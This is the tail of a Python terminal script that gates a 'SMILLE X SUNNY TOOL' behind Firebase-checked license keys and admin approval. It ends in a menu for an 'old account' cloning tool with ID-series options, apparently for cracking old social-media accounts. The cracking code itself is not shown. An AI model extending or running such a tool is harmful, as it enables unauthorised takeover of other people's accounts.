            time_left, days, hours, minutes, seconds = get_time_left(exp)
            
            print("")
            print(GREEN + "  ✅ Key Active - Tool Unlocked")
            print(GREEN + f"  👤 Name: {name}")
            print(GREEN + f"  🔑 Key: {key}")
            print(GREEN + f"  ⏰ Expires: {format_expiry(exp)}")
            print(GREEN + f"  ⏳ Time Left: {time_left}")
            print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(GREEN + "\n  ⏳ Auto-starting tool in 2 seconds...")
            time.sleep(2)
            print(GREEN + "\n🚀 Launching SMILLE X SUNNY TOOL...")
            tool_menu()
            return
    
    if pending_req:
        print("")
        print(GREEN + "  ⏳ Pending Request Found!")
        print(GREEN + f"  📅 Requested on: {pending_req.get('timestamp')}")
        print(YELLOW + "  ⚠️ Please wait for admin approval.")
        print(GREEN + "  💡 Tool will auto-start when approved.")
        print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        approved, key, exp, name = wait_for_approval(firebase, device_id)
        
        if approved and key:
            print(GREEN + "\n✅ Key Verified!")
            print(GREEN + f"🔑 Key: {key}")
            print(GREEN + f"👤 Name: {name}")
            print(GREEN + f"⏰ Expiry: {format_expiry(exp)}")
            print(GREEN + "\n🚀 Launching SMILLE X SUNNY TOOL...")
            time.sleep(2)
            tool_menu()
            return
        else:
            print(GREEN + "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(GREEN + "\n  [1] Request New Key")
            print(GREEN + "  [2] Check Key Status")
            print(GREEN + "  [3] Enter Key Manually")
            print(RED + "  [4] Exit")
            
            choice = input(YELLOW + "\n[?] Select option: ")
            
            if choice == "1":
                request_key(firebase, device_id)
            elif choice == "2":
                show_key_status(firebase, device_id)
            elif choice == "3":
                enter_manual_key(firebase, device_id)
            else:
                sys.exit(0)
            return
    
    if status == "expired":
        print("")
        print(RED + "  ⏰ Key Expired!")
        print(RED + f"  Expired on: {format_expiry(expiry)}")
        print(GREEN + "  ℹ️ You can request a new key now.")
        print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(GREEN + "\n  [1] Request New Key")
        print(GREEN + "  [2] Check Key Status")
        print(GREEN + "  [3] Enter Key Manually")
        print(RED + "  [4] Exit")
        
        choice = input(YELLOW + "\n[?] Select option: ")
        
        if choice == "1":
            request_key(firebase, device_id)
        elif choice == "2":
            show_key_status(firebase, device_id)
        elif choice == "3":
            enter_manual_key(firebase, device_id)
        else:
            sys.exit(0)
            
    else:
        print("")
        print(RED + "  ⚠ No Key Found")
        print(GREEN + "  ℹ️ Request a new key from admin.")
        print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(GREEN + "\n  [1] Request New Key")
        print(GREEN + "  [2] Check Key Status")
        print(GREEN + "  [3] Enter Key Manually")
        print(RED + "  [4] Exit")
        
        choice = input(YELLOW + "\n[?] Select option: ")
        
        if choice == "1":
            request_key(firebase, device_id)
        elif choice == "2":
            show_key_status(firebase, device_id)
        elif choice == "3":
            enter_manual_key(firebase, device_id)
        else:
            sys.exit(0)

def enter_manual_key(firebase, device_id):
    clear()
    show_banner()
    
    print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(GREEN + "  🔑 ENTER KEY MANUALLY")
    print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    
    print(GREEN + "Enter the key provided by admin:")
    key = input(YELLOW + "\n[?] Enter Key: ").strip().upper()
    
    if not key:
        print(RED + "\nKey cannot be empty!")
        time.sleep(2)
        main_menu()
        return
    
    keys = firebase.get_all_keys()
    key_found = False
    key_data = None
    
    if keys:
        for key_id, data in keys.items():
            if data.get("key") == key and data.get("device_id") == device_id:
                key_found = True
                key_data = data
                break
    
    if key_found:
        expiry = key_data.get("expiry")
        name = key_data.get("name", "User")
        save_key_file(key, device_id, expiry, name)
        print(GREEN + f"\n✅ Key Verified and Saved!")
        print(GREEN + f"📁 Saved to: key.txt")
        print(GREEN + f"⏰ Expiry: {format_expiry(expiry)}")
        print(GREEN + f"👤 Name: {name}")
        print(GREEN + f"🔑 Key: {key}")
        print(GREEN + "\n⏳ Auto-starting tool in 2 seconds...")
        time.sleep(2)
        tool_menu()
    else:
        print(RED + "\n❌ Invalid Key! Please check with admin.")
        time.sleep(2)
        main_menu()

def request_key(firebase, device_id):
    clear()
    show_banner()
    
    print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(GREEN + "  📝 REQUEST NEW KEY")
    print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    
    pending = firebase.get_request_status(device_id)
    if pending:
        print(YELLOW + "⏳ You already have a pending request!")
        print(GREEN + f"📅 Requested on: {pending.get('timestamp')}")
        print(YELLOW + "⚠️ Please wait for admin approval.")
        print(GREEN + "💡 Tool will auto-start when approved.")
        input(GREEN + "\nPress Enter to continue...")
        main_menu()
        return
    
    status, expiry = firebase.get_key_status(device_id)
    if status == "active":
        print(GREEN + "✅ You already have an active key!")
        print(GREEN + "💡 Tool will auto-start.")
        input(GREEN + "\nPress Enter to continue...")
        main_menu()
        return
    
    name = input(YELLOW + "[?] Enter your name: ").strip()
    if not name:
        name = "User"
    
    print(GREEN + f"\nDevice ID: {device_id}")
    print(GREEN + f"Name: {name}")
    
    confirm = input(YELLOW + "\n[?] Send request? (y/n): ").lower()
    if confirm != 'y':
        main_menu()
        return
    
    user_id = f"USER_{int(time.time())}"
    success, message = firebase.create_request(user_id, device_id, name)
    
    if success:
        print(GREEN + "\n✅ Request sent to admin successfully!")
        print(GREEN + "📝 Waiting for admin approval...")
        print(GREEN + "💡 Tool will auto-start when approved.")
        
        # WhatsApp link open - SIRF JAB REQUEST HO
        open_whatsapp_8methods()
        time.sleep(2)
        
        approved, key, exp, name = wait_for_approval(firebase, device_id)
        
        if approved and key:
            print(GREEN + "\n✅ Key Verified!")
            print(GREEN + f"🔑 Key: {key}")
            print(GREEN + f"👤 Name: {name}")
            print(GREEN + f"⏰ Expiry: {format_expiry(exp)}")
            print(GREEN + "\n🚀 Launching SMILLE X SUNNY TOOL...")
            time.sleep(2)
            tool_menu()
            return
        else:
            print(RED + "\nReturning to main menu...")
            time.sleep(2)
            main_menu()
    else:
        print(RED + f"\n❌ {message}")
        time.sleep(2)
        main_menu()

def show_key_status(firebase, device_id):
    clear()
    show_banner()
    
    print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(GREEN + "  🔍 KEY STATUS")
    print(GREEN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    
    status, expiry = firebase.get_key_status(device_id)
    pending = firebase.get_request_status(device_id)
    
    if status == "active":
        device_info = firebase.get_device_info(device_id)
        if device_info:
            time_left, days, hours, minutes, seconds = get_time_left(device_info['expiry'])
            
            print(GREEN + f"✅ Status: Active")
            print(GREEN + f"✅ Device ID: {device_info['device_id']}")
            print(GREEN + f"✅ Name: {device_info.get('name', 'N/A')}")
            print(GREEN + f"✅ Key: {device_info['key']}")
            print(GREEN + f"✅ Created: {device_info['created']}")
            print(GREEN + f"✅ Expires: {format_expiry(device_info['expiry'])}")
            print(GREEN + f"\n⏳ Time remaining: {time_left}")
            print(GREEN + "\n💡 Tool will auto-start on next run")
    
    elif status == "expired":
        print(RED + f"❌ Key Expired")
        print(RED + f"⏰ Expired on: {format_expiry(expiry)}")
        print(GREEN + "📝 You can request a new key.")
    
    elif status == "inactive":
        print(YELLOW + "⚠ Key Inactive")
        print(GREEN + "📝 You can request a new key.")
    
    else:
        print(RED + "❌ No key found for this device.")
        if pending:
            print(GREEN + f"\n⏳ Pending Request Found!")
            print(GREEN + f"📅 Requested on: {pending.get('timestamp')}")
            print(GREEN + "💡 Tool will auto-start when approved.")
        else:
            print(GREEN + "📝 Please request a new key from admin.")
    
    saved_key = load_saved_key()
    if saved_key:
        print(GREEN + f"\n📁 Local key found: {saved_key}")
        print(GREEN + f"📁 Location: key.txt")
    
    input(GREEN + "\n\nPress Enter to continue...")
    main_menu()

def tool_menu():
    clear()
    show_banner()
    print(GREEN + '       (A) OLD ACCOUNT TOOL')
    print(GREEN + "──────────────────────────────────────────")
    __Jihad__ = input(YELLOW + "       CHOICE : ")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(RED + "\n    Choose Valid Option... ")
        time.sleep(2)
        tool_menu()

def old_clone():
    clear()
    show_banner()
    print(GREEN + '       (A) ALL SERIES')
    print(GREEN + "──────────────────────────────────────────")
    print(GREEN + '       (B) 100003/4 SERIES')
    print(GREEN + "──────────────────────────────────────────")
    print(GREEN + '       (C) 2009 series')
    print(GREEN + "──────────────────────────────────────────")
    _input = input(YELLOW + "       CHOICE : ")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(RED + "\n[×] Choose Value Option... ")
        tool_menu()

# ==================== MAIN ====================
if __name__ == "__main__":
    try:
        os.makedirs("/sdcard", exist_ok=True)
    except:
        pass
    
    while True:
        try:
            main_menu()
        except KeyboardInterrupt:
            print(RED + "\nExiting...")
            sys.exit(0)
        except Exception as e:
            print(RED + f"\nError: {e}")
            time.sleep(2)